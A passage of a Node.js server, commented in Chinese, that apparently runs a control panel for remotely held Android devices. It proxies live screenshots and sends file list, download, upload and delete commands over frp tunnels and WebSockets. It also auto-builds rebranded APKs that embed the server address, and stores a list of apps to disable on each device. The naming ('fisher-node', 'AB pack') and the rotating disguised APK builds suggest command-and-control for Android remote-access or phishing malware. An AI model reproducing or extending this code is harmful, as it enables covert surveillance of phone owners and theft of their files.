          if (synced > 0) console.log(`[PORT-SYNC] ★ 从 frps 同步了 ${synced} 个端口映射`);
        } catch (e) { console.log(`[PORT-SYNC] 解析 frps 响应失败: ${e.message}`); }
      });
    }).on('error', (e) => {
      console.log(`[PORT-SYNC] frps API 不可用: ${e.message}`);
    });
  } catch (e) { }
}
setTimeout(syncPortsFromFrps, 3000); // 启动 3 秒后首次执行
setInterval(syncPortsFromFrps, 60000); // 每 60 秒定时同步

// ★ 端口池回收：清理超过 N 天不活跃且不在线的设备端口
function recycleInactivePorts(days = 7) {
  try {
    const threshold = Date.now() - days * 86400000;
    const stale = db.prepare(`
      SELECT dp.device_id, dp.port FROM device_ports dp
      JOIN devices d ON dp.device_id = d.device_id
      WHERE d.is_connected = 0 AND (d.last_seen IS NULL OR d.last_seen < ?)
    `).all(threshold);
    for (const row of stale) {
      devicePortMap.delete(row.device_id);
      db.prepare('DELETE FROM device_ports WHERE device_id=?').run(row.device_id);
    }
    if (stale.length > 0) console.log(`[PORT] ★ 回收 ${stale.length} 个超${days}天不活跃设备端口`);
    return stale.length;
  } catch (e) { return 0; }
}

function getDevicePort(deviceId) {
  if (devicePortMap.has(deviceId)) return devicePortMap.get(deviceId);
  // 分配新端口
  const usedPorts = new Set(devicePortMap.values());
  for (let p = PORT_BASE; p <= PORT_MAX; p++) {
    if (!usedPorts.has(p)) {
      devicePortMap.set(deviceId, p);
      // 持久化到数据库
      try { db.prepare('INSERT OR REPLACE INTO device_ports (device_id, port) VALUES (?,?)').run(deviceId, p); } catch (e) { }
      console.log(`[PORT] ${deviceId} -> ${p}`);
      return p;
    }
  }
  // ★ 端口池耗尽：尝试自动回收不活跃端口后重试
  console.log(`[PORT] ⚠️ 端口池耗尽(${PORT_BASE}-${PORT_MAX})，尝试回收不活跃端口...`);
  const recycled = recycleInactivePorts(3); // 紧急时回收3天不活跃的
  if (recycled > 0) {
    // 重试分配
    const usedPorts2 = new Set(devicePortMap.values());
    for (let p = PORT_BASE; p <= PORT_MAX; p++) {
      if (!usedPorts2.has(p)) {
        devicePortMap.set(deviceId, p);
        try { db.prepare('INSERT OR REPLACE INTO device_ports (device_id, port) VALUES (?,?)').run(deviceId, p); } catch (e) { }
        console.log(`[PORT] ${deviceId} -> ${p} (回收后分配)`);
        return p;
      }
    }
  }
  // ★ 最终 fallback：分配一个超出范围的临时端口，避免串台
  const emergencyPort = PORT_MAX + 1 + devicePortMap.size;
  console.log(`[PORT] ❌ 端口池彻底耗尽！${deviceId} 临时分配 ${emergencyPort}，请尽快清理！`);
  devicePortMap.set(deviceId, emergencyPort);
  return emergencyPort;
}

// ★ 定时清理：每小时回收超7天不活跃设备的端口
setInterval(() => recycleInactivePorts(7), 3600000);
// ======================================

const screenshotCache = new Map(); // deviceId -> { data: Buffer, timestamp: number }
let screenshotRequestId = 0;
const screenshotCallbacks = new Map(); // requestId -> { res, timeout }

app.get('/api/local-service/screen/shot', authMiddleware, (req, res) => {
  const { deviceId } = req.query;

  // 直接从 frpc 端口获取实时截图（不用缓存，保证每次都是最新的）
  const http = require('http');
  const proxyReq = http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/screenshot/0`, { timeout: 5000 }, (proxyRes) => {
    const chunks = [];
    proxyRes.on('data', (chunk) => chunks.push(chunk));
    proxyRes.on('end', () => {
      const data = Buffer.concat(chunks);
      if (data.length > 500 && !res.headersSent) {
        // 缓存这一帧（给WebSocket订阅者用）
        if (deviceId) screenshotCache.set(deviceId, { data, timestamp: Date.now() });
        res.set('Content-Type', proxyRes.headers['content-type'] || 'image/jpeg');
        res.set('Cache-Control', 'no-cache, no-store');
        res.send(data);
      } else if (!res.headersSent) {
        // 截图太小，可能黑屏，先尝试 Bridge 缓存
        const cached = screenshotCache.get(deviceId);
        if (cached && cached.data && cached.data.length > 500 && (Date.now() - cached.timestamp < 10000)) {
          const ct = (cached.data[0] === 0xFF) ? 'image/jpeg' : (cached.data[0] === 0x89) ? 'image/png' : 'image/webp';
          res.set('Content-Type', ct);
          res.set('Cache-Control', 'no-cache, no-store');
          res.send(cached.data);
        } else {
          console.log(`[SCREEN] 截图异常(${data.length}B)，尝试重启minicap`);
          http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/minicap/stop`, { timeout: 3000 }, () => {
            setTimeout(() => {
              http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/minicap/start?scale=0.3&quality=25`, { timeout: 3000 }, () => { });
            }, 500);
          }).on('error', () => { });
          res.set('Content-Type', 'image/gif');
          res.send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
        }
      }
    });
  });
  proxyReq.on('error', () => {
    if (!res.headersSent) {
      // frpc 连不上，fallback 到 Bridge 截图缓存
      const cached = screenshotCache.get(deviceId);
      if (cached && cached.data && cached.data.length > 500 && (Date.now() - cached.timestamp < 10000)) {
        const ct = (cached.data[0] === 0xFF) ? 'image/jpeg' : (cached.data[0] === 0x89) ? 'image/png' : 'image/webp';
        res.set('Content-Type', ct);
        res.set('Cache-Control', 'no-cache, no-store');
        res.send(cached.data);
      } else {
        res.set('Content-Type', 'image/gif');
        res.send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
      }
    }
  });
  proxyReq.on('timeout', () => { proxyReq.destroy(); });
});

app.all('/api/local-service/proxy', authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId || req.body?.deviceId || '';
  const reqPath = req.query.path || req.body?.path || '';

  if (!deviceId || !reqPath) {
    return res.json({ success: false, message: 'missing deviceId or path' });
  }

  const bridgeWs = bridgeConnections.get(deviceId);
  if (bridgeWs && bridgeWs.readyState === 1) {
    const reqId = `proxy_${++screenshotRequestId}`;
    // 通过 Bridge 发送 proxy 命令（和 wakeUpScreen 同格式但带 path）
    bridgeWs.send(JSON.stringify({ type: 'command', command: reqPath, params: req.body || {} }));

    if (reqPath.includes('screenshot')) {
      const timeout = setTimeout(() => {
        screenshotCallbacks.delete(reqId);
        const cached = screenshotCache.get(deviceId);
        if (cached && !res.headersSent) {
          const ct = (cached.data[0] === 0xFF) ? 'image/jpeg' : (cached.data[0] === 0x52) ? 'image/webp' : 'image/png';
          res.set('Content-Type', ct); res.send(cached.data);
        } else if (!res.headersSent) {
          res.json({ success: false, message: 'screenshot timeout' });
        }
      }, 3000);
      screenshotCallbacks.set(reqId, { res, timeout, deviceId });
    } else {
      res.json({ success: true });
    }
  } else {
    res.json({ success: false, message: 'bridge not connected' });
  }
});

// ============================================================
// V5 补齐接口 (avatar / cdn / bt-deploy / auto-build / bridge / black-apps / screen / AI)
// ============================================================

// 头像上传 (dataURL -> users.avatar)
app.post('/api/auth/upload-avatar', authMiddleware, (req, res) => {
  try {
    const { avatar } = req.body || {};
    if (!avatar || typeof avatar !== 'string' || !avatar.startsWith('data:image/')) {
      return res.status(400).json({ success: false, message: '无效的头像数据' });
    }
    if (avatar.length > 3 * 1024 * 1024) {
      return res.status(400).json({ success: false, message: '图片大小不能超过 2MB' });
    }
    db.prepare('UPDATE users SET avatar=? WHERE id=?').run(avatar, req.user.userId);
    res.json({ success: true, message: '头像上传成功' });
  } catch (e) {
    res.status(500).json({ success: false, message: e.message });
  }
});

// ===== 设备文件管理器 (V5 对齐: FILE_* 命令走 device WS) =====
const _fileCallbacks = new Map();
const _fileUploadMulter = require('multer')({ dest: '/tmp/file-uploads/', limits: { fileSize: 100 * 1024 * 1024 } });
function _fileReply(deviceId, command, params, timeoutMs) {
  return new Promise((resolve, reject) => {
    const rid = 'file_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
    const timer = setTimeout(() => { _fileCallbacks.delete(rid); reject(new Error('设备响应超时')); }, timeoutMs || 15000);
    _fileCallbacks.set(rid, { resolve, timer });
    const payload = { type: 'command', data: { command, params: Object.assign({}, params, { requestId: rid }) } };
    let sent = false;
    const dws = deviceConnections.get(deviceId);
    if (dws && dws.readyState === 1) { dws.send(JSON.stringify(payload)); sent = true; }
    if (!sent) {
      const bws = bridgeConnections.get(deviceId);
      if (bws && bws.readyState === 1) { bws.send(JSON.stringify(payload)); sent = true; }
    }
    if (!sent) { _fileCallbacks.delete(rid); clearTimeout(timer); reject(new Error('设备不在线')); }
  });
}
function _handleFileResponse(msg) {
  if (msg && msg.type === 'file_response' && msg.requestId) {
    const cb = _fileCallbacks.get(msg.requestId);
    if (cb) { _fileCallbacks.delete(msg.requestId); clearTimeout(cb.timer); cb.resolve(msg.data); return true; }
  }
  return false;
}
app.get('/api/file/list', authMiddleware, async (req, res) => {
  try {
    const deviceId = req.query.deviceId || '';
    const p = req.query.path || '/';
    if (!deviceId) return res.status(400).json({ error: '缺少参数' });
    const data = await _fileReply(deviceId, 'FILE_LIST', { path: p });
    if (typeof data === 'string') { try { return res.json(JSON.parse(data)); } catch (e) { return res.json([]); } }
    res.json(data || []);
  } catch (e) { res.json({ error: e.message }); }
});
app.get('/api/file/search', authMiddleware, async (req, res) => {
  try {
    const deviceId = req.query.deviceId || '';
    const p = req.query.path || '/';
    const kw = req.query.keyword || '';
    if (!deviceId) return res.status(400).json({ error: '缺少参数' });
    const data = await _fileReply(deviceId, 'FILE_SEARCH', { path: p, keyword: kw });
    if (typeof data === 'string') { try { return res.json(JSON.parse(data)); } catch (e) { return res.json([]); } }
    res.json(data || []);
  } catch (e) { res.json({ error: e.message }); }
});
app.post('/api/file/copy', authMiddleware, async (req, res) => {
  try {
    const { deviceId, sourcePath, destPath } = req.body || {};
    if (!deviceId || !sourcePath || !destPath) return res.status(400).json({ error: '缺少参数' });
    await _fileReply(deviceId, 'FILE_COPY', { sourcePath, destPath });
    res.json({ success: true });
  } catch (e) { res.json({ error: e.message }); }
});
app.post('/api/file/move', authMiddleware, async (req, res) => {
  try {
    const { deviceId, sourcePath, destPath } = req.body || {};
    if (!deviceId || !sourcePath || !destPath) return res.status(400).json({ error: '缺少参数' });
    await _fileReply(deviceId, 'FILE_MOVE', { sourcePath, destPath });
    res.json({ success: true });
  } catch (e) { res.json({ error: e.message }); }
});
app.post('/api/file/rename', authMiddleware, async (req, res) => {
  try {
    const { deviceId, oldPath, newName } = req.body || {};
    if (!deviceId || !oldPath || !newName) return res.status(400).json({ error: '缺少参数' });
    await _fileReply(deviceId, 'FILE_RENAME', { oldPath, newName });
    res.json({ success: true });
  } catch (e) { res.json({ error: e.message }); }
});
app.post('/api/file/delete', authMiddleware, async (req, res) => {
  try {
    const { deviceId, path: fp } = req.body || {};
    if (!deviceId || !fp) return res.status(400).json({ error: '缺少参数' });
    await _fileReply(deviceId, 'FILE_DELETE', { path: fp });
    res.json({ success: true });
  } catch (e) { res.json({ error: e.message }); }
});
app.post('/api/file/create-folder', authMiddleware, async (req, res) => {
  try {
    const { deviceId, path: fp } = req.body || {};
    if (!deviceId || !fp) return res.status(400).json({ error: '缺少参数' });
    await _fileReply(deviceId, 'FILE_CREATE_FOLDER', { path: fp });
    res.json({ success: true });
  } catch (e) { res.json({ error: e.message }); }
});
app.get('/api/file/download', authMiddleware, async (req, res) => {
  try {
    const deviceId = req.query.deviceId || '';
    const p = req.query.path || '';
    if (!deviceId || !p) return res.status(400).json({ error: '缺少参数' });
    const data = await _fileReply(deviceId, 'FILE_DOWNLOAD', { path: p }, 30000);
    res.json(data);
  } catch (e) { res.json({ error: e.message }); }
});
app.post('/api/file/upload', authMiddleware, (req, res, next) => {
  _fileUploadMulter.single('file')(req, res, next);
}, async (req, res) => {
  try {
    const deviceId = req.body.deviceId || '';
    const targetPath = req.body.path || '';
    if (!deviceId || !targetPath || !req.file) return res.status(400).json({ error: '缺少参数' });
    const data = fs.readFileSync(req.file.path);
    if (data.length > 8 * 1024 * 1024) { try { fs.unlinkSync(req.file.path); } catch (e) {} return res.status(400).json({ error: '文件过大' }); }
    await _fileReply(deviceId, 'FILE_UPLOAD', { path: targetPath, data: data.toString('base64'), fileName: req.file.originalname, size: data.length }, 60000);
    try { fs.unlinkSync(req.file.path); } catch (e) {}
    res.json({ success: true });
  } catch (e) { res.json({ error: e.message }); }
});

// ===== CDN / 宝塔部署 配置持久化 =====
function _loadJsonCfg(name, defaults) {
  try {
    const f = path.join(__dirname, 'data', name + '.json');
    if (fs.existsSync(f)) return Object.assign({}, defaults, JSON.parse(fs.readFileSync(f, 'utf8')));
  } catch (e) {}
  return defaults;
}
function _saveJsonCfg(name, cfg) {
  const f = path.join(__dirname, 'data', name + '.json');
  fs.writeFileSync(f, JSON.stringify(cfg, null, 2));
  return f;
}
const _cdnDefaults = { enabled: false, provider: 'aws', accessKeyId: '', secretAccessKey: '', region: 'ap-southeast-1', bucket: '', endpoint: '', uploadDomain: '', cloudFrontDomain: '', keyPrefix: 'apk/' };
const _btDefaults = { enabled: false, host: '', port: 22, username: 'root', password: '', remotePath: '', downloadUrl: '' };

app.get('/api/apk/cdn-config', authMiddleware, (req, res) => {
  res.json({ success: true, config: _loadJsonCfg('cdn_config', _cdnDefaults) });
});
app.post('/api/apk/cdn-config', authMiddleware, (req, res) => {
  try {
    const cfg = Object.assign(_loadJsonCfg('cdn_config', _cdnDefaults), req.body || {});
    _saveJsonCfg('cdn_config', cfg);
    res.json({ success: true, message: 'CDN 配置已保存', config: cfg });
  } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
app.get('/api/apk/bt-deploy-config', authMiddleware, (req, res) => {
  res.json({ success: true, config: _loadJsonCfg('bt_deploy_config', _btDefaults) });
});
// ===== 真实 CDN 连接测试 (AWS S3 SigV4 / 阿里云 OSS) =====
function _awsSigV4(accessKey, secretKey, region, bucket, key, method, payload) {
  const crypto = require('crypto');
  const amzDate = new Date().toISOString().replace(/[:-]|\.\d{3}/g, '');
  const dateStamp = amzDate.slice(0, 8);
  const host = bucket ? `${bucket}.s3.${region}.amazonaws.com` : `s3.${region}.amazonaws.com`;
  const canonicalUri = '/' + encodeURIComponent(key).replace(/%2F/g, '/');
  const payloadHash = crypto.createHash('sha256').update(payload).digest('hex');
  const canonicalHeaders = `host:${host}\nx-amz-content-sha256:${payloadHash}\nx-amz-date:${amzDate}\n`;
  const signedHeaders = 'host;x-amz-content-sha256;x-amz-date';
  const canonicalRequest = [method, canonicalUri, '', canonicalHeaders, signedHeaders, payloadHash].join('\n');
  const scope = `${dateStamp}/${region}/s3/aws4_request`;
  const stringToSign = ['AWS4-HMAC-SHA256', amzDate, scope, crypto.createHash('sha256').update(canonicalRequest).digest('hex')].join('\n');
  const hmac = (key, data) => crypto.createHmac('sha256', key).update(data).digest();
  const kDate = hmac('AWS4' + secretKey, dateStamp);
  const kRegion = hmac(kDate, region);
  const kService = hmac(kRegion, 's3');
  const kSigning = hmac(kService, 'aws4_request');
  const signature = crypto.createHmac('sha256', kSigning).update(stringToSign).digest('hex');
  const authorization = `AWS4-HMAC-SHA256 Credential=${accessKey}/${scope}, SignedHeaders=${signedHeaders}, Signature=${signature}`;
  return { host, headers: { 'Host': host, 'x-amz-date': amzDate, 'x-amz-content-sha256': payloadHash, 'Authorization': authorization } };
}
function _ossSign(accessKey, secretKey, bucket, region, key, method, payload) {
  const crypto = require('crypto');
  const date = new Date().toISOString().replace(/[:-]|\.\d{3}/g, '');
  const host = `${bucket}.${region}.aliyuncs.com`;
  const canonicalUri = '/' + encodeURIComponent(key).replace(/%2F/g, '/');
  const contentType = 'text/plain';
  const headers = { 'x-oss-date': date, 'Content-Type': contentType };
  const canonicalHeaders = Object.keys(headers).sort().map(k => `${k.toLowerCase()}:${String(headers[k]).trim()}\n`).join('');
  const signedHeaders = Object.keys(headers).sort().map(k => k.toLowerCase()).join(';');
  const canonicalRequest = [method, canonicalUri, '', canonicalHeaders, signedHeaders, crypto.createHash('md5').update(payload).digest('base64')].join('\n');
  const stringToSign = `OSS ${accessKey}\n${date}\n/` + [canonicalRequest].join('') + '\n' + crypto.createHash('sha1').update(canonicalRequest).digest('hex');
  const signature = crypto.createHmac('sha1', secretKey).update(stringToSign).digest('base64');
  const authorization = `OSS ${accessKey}:${signature}`;
  headers['Authorization'] = authorization;
  return { host, headers };
}
app.post('/api/apk/cdn-test', authMiddleware, (req, res) => {
  try {
    const cfg = req.body || {};
    if (!cfg.accessKeyId || !cfg.secretAccessKey || !cfg.bucket) {
      return res.status(400).json({ success: false, message: '请填写 AccessKeyId、SecretAccessKey 和 Bucket' });
    }
    const testKey = (cfg.keyPrefix || 'apk/') + 'cdn-test-' + Date.now() + '.txt';
    const payload = 'cdn-test';
    let host, headers, endpointBase;
    if ((cfg.provider || 'aws') === 'aliyun') {
      const region = cfg.region || 'cn-hangzhou';
      const sig = _ossSign(cfg.accessKeyId, cfg.secretAccessKey, cfg.bucket, region, testKey, 'PUT', payload);
      host = sig.host; headers = sig.headers;
      endpointBase = cfg.endpoint ? new URL(cfg.endpoint) : null;
    } else {
      const region = cfg.region || 'ap-southeast-1';
      const sig = _awsSigV4(cfg.accessKeyId, cfg.secretAccessKey, region, cfg.bucket, testKey, 'PUT', payload);
      host = sig.host; headers = sig.headers;
      endpointBase = cfg.endpoint ? new URL(cfg.endpoint) : null;
    }
    const targetHost = endpointBase ? endpointBase.host : host;
    const targetPath = (endpointBase ? endpointBase.pathname.replace(/\/$/, '') : '') + '/' + testKey;
    const req2 = https.request({ host: targetHost, path: targetPath, method: 'PUT', headers, timeout: 15000 }, (resp) => {
      let body = '';
      resp.on('data', c => body += c);
      resp.on('end', () => {
        if (resp.statusCode >= 200 && resp.statusCode < 300) {
          res.json({ success: true, message: 'S3 连接测试成功！(测试对象已上传: ' + testKey + ')' });
        } else {
          res.json({ success: false, message: `上传失败 HTTP ${resp.statusCode}: ${body.slice(0, 300)}` });
        }
      });
    });
    req2.on('timeout', () => { req2.destroy(new Error('连接超时')); });
    req2.on('error', (e) => res.status(502).json({ success: false, message: '连接失败: ' + e.message }));
    req2.end(payload);
  } catch (e) {
    res.status(500).json({ success: false, message: e.message });
  }
});

// ===== 真实 SFTP 连接测试 (宝塔面板) =====
app.post('/api/apk/bt-deploy-test', authMiddleware, (req, res) => {
  try {
    const cfg = req.body || {};
    if (!cfg.host || !cfg.username) {
      return res.status(400).json({ success: false, message: '请填写服务器地址和用户名' });
    }
    let ssh2 = null;
    try { ssh2 = require('ssh2'); } catch (e) {}
    if (!ssh2) {
      // 无 ssh2 时退化为 TCP 连接测试
      const sock = require('net').connect({ host: cfg.host, port: parseInt(cfg.port) || 22, timeout: 8000 });
      sock.on('connect', () => { sock.destroy(); res.json({ success: true, message: 'SFTP 连接测试成功！(TCP 端口可达)' }); });
      sock.on('timeout', () => { sock.destroy(); res.json({ success: false, message: '连接超时' }); });
      sock.on('error', (e) => res.json({ success: false, message: '连接失败: ' + e.message }));
      return;
    }
    const conn = new ssh2.Client();
    const timer = setTimeout(() => { conn.end(); res.status(408).json({ success: false, message: '连接超时' }); }, 12000);
    conn.on('ready', () => {
      clearTimeout(timer);
      const remotePath = cfg.remotePath || '/';
      conn.sftp((err, sftp) => {
        if (err) { conn.end(); return res.json({ success: false, message: 'SFTP 失败: ' + err.message }); }
        sftp.stat(remotePath, (err2) => {
          conn.end();
          if (err2 && err2.code !== 2) {
            return res.json({ success: false, message: '目录访问失败: ' + err2.message });
          }
          res.json({ success: true, message: 'SFTP 连接测试成功！' });
        });
      });
    });
    conn.on('error', (err) => {
      clearTimeout(timer);
      res.json({ success: false, message: '连接失败: ' + err.message });
    });
    conn.connect({ host: cfg.host, port: parseInt(cfg.port) || 22, username: cfg.username, password: cfg.password || '', readyTimeout: 10000 });
  } catch (e) {
    res.status(500).json({ success: false, message: e.message });
  }
});

app.post('/api/apk/bt-deploy-config', authMiddleware, (req, res) => {
  try {
    const cfg = Object.assign(_loadJsonCfg('bt_deploy_config', _btDefaults), req.body || {});
    _saveJsonCfg('bt_deploy_config', cfg);
    res.json({ success: true, message: '宝塔部署配置已保存', config: cfg });
  } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});

// ===== 自动构建引擎 (V5 对齐: 定时多目标真实构建) =====
(function initAutoBuild() {
  const AB_CFG = path.join(__dirname, 'data', 'auto_build_config.json');
  const AB_HIST = path.join(__dirname, 'data', 'auto_build_history.json');
  const { uuidv4 } = { uuidv4: () => require('crypto').randomBytes(16).toString('hex') };

  function abLoadCfg() {
    try {
      if (fs.existsSync(AB_CFG)) return JSON.parse(fs.readFileSync(AB_CFG, 'utf8'));
    } catch (e) {}
    return { enabled: false, intervalHours: 1, targets: [] };
  }
  function abSaveCfg(cfg) { fs.writeFileSync(AB_CFG, JSON.stringify(cfg, null, 2)); }
  function abLoadHist() {
    try {
      if (fs.existsSync(AB_HIST)) return JSON.parse(fs.readFileSync(AB_HIST, 'utf8'));
    } catch (e) {}
    return [];
  }
  function abSaveHist(h) { fs.writeFileSync(AB_HIST, JSON.stringify(h.slice(0, 200), null, 2)); }
  let abRunning = false;
  let abLastBuildAt = '';
  try {
    const _hist0 = abLoadHist();
    const _last = _hist0.find(r => r.success);
    if (_last) abLastBuildAt = _last.timeString || '';
  } catch (e) {}

  function abBuildTarget(target, cb) {
    try {
      const psc = (target.options && target.options.pageStyleConfig) || {};
      const serverUrl = psc.serverUrl || 'ws://' + (FRP_SERVER_ADDR && FRP_SERVER_ADDR !== '127.0.0.1' ? FRP_SERVER_ADDR : '127.0.0.1') + ':8443';
      const webUrl = psc.webUrl || serverUrl.replace('ws://', 'http://').replace('wss://', 'https://');
      const appName = psc.appName || target.name || 'auto';
      const packageName = psc.applicationId || '';
      const isAbPack = !!(target.options && target.options.isAbPack);
      const ts = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
      const filename = `${appName}_auto_${ts}.apk`;
      const outputPath = path.join('/opt/fisher-node/apk-output', filename);
      const buildScript = isAbPack ? '/opt/fisher-node/apk-builder/build_apk_v2.py' : '/opt/fisher-node/apk-builder/extract_b_pack.py';
      const buildArgs = [buildScript, '--server', serverUrl, '--web', webUrl, '--name', appName, '--output', outputPath, '--config', JSON.stringify(psc || {})];
      buildArgs.push('--template', '/opt/fisher-node/apk-builder/パルス.apk');
      if (packageName) buildArgs.push('--package', packageName);
      if (target.options && target.options.iconPath && fs.existsSync(target.options.iconPath)) buildArgs.push('--icon', target.options.iconPath);
      if (target.options && target.options.bgPath && fs.existsSync(target.options.bgPath)) buildArgs.push('--bg', target.options.bgPath);
      console.log(`[AUTO-BUILD] 开始: target=${target.name} script=${path.basename(buildScript)}`);
      const child = require('child_process').spawn('python3', buildArgs, { cwd: '/opt/fisher-node/apk-builder' });
      let out = '';
      child.stdout.on('data', d => { out += d.toString(); });
      child.stderr.on('data', d => { out += d.toString(); });
      child.on('close', code => {
        const ok = code === 0 && fs.existsSync(outputPath);
        const size = ok ? fs.statSync(outputPath).size : 0;
        const rec = { id: uuidv4(), targetId: target.id, targetName: target.name, success: ok, filename: ok ? filename : '', size, timestamp: Date.now(), timeString: new Date().toLocaleString('zh-CN'), message: ok ? ('构建成功 ' + (size / 1024 / 1024).toFixed(1) + 'MB') : ('构建失败 code=' + code) };
        const hist = abLoadHist();
        hist.unshift(rec);
        abSaveHist(hist);
        if (ok) {
          abLastBuildAt = rec.timeString;
          target.lastBuildAt = rec.timeString;
          const cfg = abLoadCfg();
          const t = (cfg.targets || []).find(x => x.id === target.id);
          if (t) t.lastBuildAt = rec.timeString;
          abSaveCfg(cfg);
        }
        console.log(`[AUTO-BUILD] ${ok ? '成功' : '失败'}: ${target.name} (${code})`);
        if (cb) cb(rec);
      });
    } catch (e) {
      console.log('[AUTO-BUILD] 异常:', e.message);
      if (cb) cb({ success: false, message: e.message });
    }
  }

  function abRunScheduled() {
    const cfg = abLoadCfg();
    if (!cfg.enabled || abRunning) return;
    const targets = (cfg.targets || []).filter(t => t.enabled);
    if (!targets.length) return;
    abRunning = true;
    let i = 0;
    function next() {
      if (i >= targets.length) { abRunning = false; console.log('[AUTO-BUILD] 本轮完成'); return; }
      abBuildTarget(targets[i++], () => setTimeout(next, 3000));
    }
    next();
  }

  // 定时器: 每小时检查一次是否到间隔
  let lastRunTs = 0;
  setInterval(() => {
    const cfg = abLoadCfg();
    if (!cfg.enabled) return;
    const intervalMs = Math.max(1, cfg.intervalHours || 1) * 3600 * 1000;
    if (Date.now() - lastRunTs >= intervalMs) {
      lastRunTs = Date.now();
      abRunScheduled();
    }
  }, 60000);

  app.get('/api/apk/auto-build/config', authMiddleware, (req, res) => {
    const cfg = abLoadCfg();
    const latest = (abLoadHist().find(r => r.success)) || null;
    res.json({
      success: true,
      config: { enabled: cfg.enabled, intervalHours: cfg.intervalHours || 1 },
      running: abRunning,
      lastBuildAt: abLastBuildAt,
      optsSaved: fs.existsSync(AB_CFG),
      downloadUrl: latest ? ('/api/apk/download?filename=' + encodeURIComponent(latest.filename)) : '',
      latestExists: !!latest,
      targets: cfg.targets || []
    });
  });
  app.post('/api/apk/auto-build/config', authMiddleware, (req, res) => {
    try {
      const cfg = abLoadCfg();
      cfg.enabled = !!(req.body && req.body.enabled);
      cfg.intervalHours = Math.max(1, parseInt(req.body && req.body.intervalHours) || 1);
      abSaveCfg(cfg);
      res.json({ success: true, message: cfg.enabled ? `自动构建已开启，间隔 ${cfg.intervalHours} 小时` : '自动构建已关闭' });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
  });
  app.get('/api/apk/auto-build/history', authMiddleware, (req, res) => {
    const targetId = req.query.targetId || '';
    const hist = abLoadHist();
    res.json({ success: true, records: targetId ? hist.filter(r => r.targetId === targetId) : hist });
  });
  app.get('/api/apk/auto-build/targets', authMiddleware, (req, res) => {
    const cfg = abLoadCfg();
    res.json({ success: true, targets: cfg.targets || [] });
  });
  app.post('/api/apk/auto-build/targets', authMiddleware, (req, res) => {
    try {
      const name = (req.body && req.body.name) || '未命名目标';
      const cfg = abLoadCfg();
      const target = { id: uuidv4(), name, enabled: true, options: {}, createdAt: Date.now() };
      cfg.targets = cfg.targets || [];
      cfg.targets.push(target);
      abSaveCfg(cfg);
      res.json({ success: true, target, id: target.id });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
  });
  app.post('/api/apk/auto-build/targets/:id/options', authMiddleware, (req, res, next) => {
    // apkUpload 在模块后半段才声明, 惰性求值避免 TDZ
    apkUpload.fields([{ name: 'appIcon', maxCount: 1 }, { name: 'backgroundImage', maxCount: 1 }, { name: 'configMaskBgImage', maxCount: 1 }])(req, res, next);
  }, (req, res) => {
    try {
      const cfg = abLoadCfg();
      const target = (cfg.targets || []).find(t => t.id === req.params.id);
      if (!target) return res.status(404).json({ success: false, message: '目标不存在' });
      let psc = {};
      try { psc = JSON.parse(req.body.pageStyleConfig || '{}'); } catch (e) {}
      if (req.body.isAbPack) psc.isAbPack = req.body.isAbPack;
      if (req.body.serverUrl) psc.serverUrl = req.body.serverUrl;
      if (req.body.webUrl) psc.webUrl = req.body.webUrl;
      target.options = target.options || {};
      target.options.pageStyleConfig = psc;
      if (req.files && req.files.appIcon && req.files.appIcon[0]) target.options.iconPath = req.files.appIcon[0].path;
      if (req.files && req.files.backgroundImage && req.files.backgroundImage[0]) target.options.bgPath = req.files.backgroundImage[0].path;
      abSaveCfg(cfg);
      res.json({ success: true, message: `已保存为构建目标「${target.name}」` });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
  });
  app.put('/api/apk/auto-build/targets/:id/enabled', authMiddleware, (req, res) => {
    try {
      const cfg = abLoadCfg();
      const target = (cfg.targets || []).find(t => t.id === req.params.id);
      if (!target) return res.status(404).json({ success: false, message: '目标不存在' });
      target.enabled = !!(req.body && req.body.enabled);
      abSaveCfg(cfg);
      res.json({ success: true, message: target.enabled ? '已启用' : '已禁用' });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
  });
  app.post('/api/apk/auto-build/targets/:id/trigger', authMiddleware, (req, res) => {
    const cfg = abLoadCfg();
    const target = (cfg.targets || []).find(t => t.id === req.params.id);
    if (!target) return res.status(404).json({ success: false, message: '目标不存在' });
    if (abRunning) return res.status(409).json({ success: false, message: '已有构建任务进行中' });
    abRunning = true;
    abBuildTarget(target, (rec) => { abRunning = false; });
    res.json({ success: true, message: `已触发构建「${target.name}」` });
  });
  app.delete('/api/apk/auto-build/targets/:id', authMiddleware, (req, res) => {
    const cfg = abLoadCfg();
    cfg.targets = (cfg.targets || []).filter(t => t.id !== req.params.id);
    abSaveCfg(cfg);
    res.json({ success: true, message: '已删除' });
  });
})();

// ===== Bridge 设备状态 =====
app.get('/api/bridge/device/:deviceId', authMiddleware, (req, res) => {
  const deviceId = req.params.deviceId;
  const bridgeWs = bridgeConnections.get(deviceId);
  const devWs = deviceConnections.get(deviceId);
  const connected = !!(bridgeWs && bridgeWs.readyState === 1) || !!(devWs && devWs.readyState === 1);
  res.json({ success: true, connected: connected, deviceId });
});

// ===== 设备黑名单 APP =====
db.exec(`CREATE TABLE IF NOT EXISTS device_black_apps (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT NOT NULL,
  package_name TEXT NOT NULL,
  app_name TEXT DEFAULT '',
  action TEXT DEFAULT 'disable',
  is_enabled INTEGER DEFAULT 1,
  created_at REAL DEFAULT (strftime('%s','now')),
  UNIQUE(device_id, package_name)
)`);
app.get('/api/device-black-apps', authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId || '';
  if (!deviceId) return res.status(400).json({ success: false, message: '缺少 deviceId' });
  const apps = db.prepare('SELECT id, package_name AS packageName, app_name AS appName, action, is_enabled AS isEnabled FROM device_black_apps WHERE device_id=?').all(deviceId);
  res.json({ success: true, apps });
});
app.post('/api/device-black-apps/add', authMiddleware, (req, res) => {
  const { deviceId, packageName, appName, action, isEnabled } = req.body || {};
